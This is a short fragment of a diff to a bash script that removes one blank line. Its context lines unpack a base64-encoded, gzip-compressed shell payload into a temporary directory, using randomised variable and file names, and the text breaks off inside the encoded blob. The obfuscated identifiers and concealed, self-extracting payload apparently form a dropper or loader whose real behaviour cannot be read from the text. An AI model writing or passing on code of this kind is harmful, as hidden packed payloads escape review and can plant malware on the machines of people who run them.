@@ -1,5 +1,4 @@
 #!/bin/bash
-
 ibaiImlzewgaer=$(mktemp -d)
 cat << 'EOF2' | base64 -d | gunzip > "$ibaiImlzewgaer/ilkrukszldatiulegjaer"
 H4sICBJxrmgAA3R0LnNoAO1YUW/TVhR+rn/FwQnQrCQmSNWksVRikEkRtEWh5QWQ5cQ3sUViZ/Y1
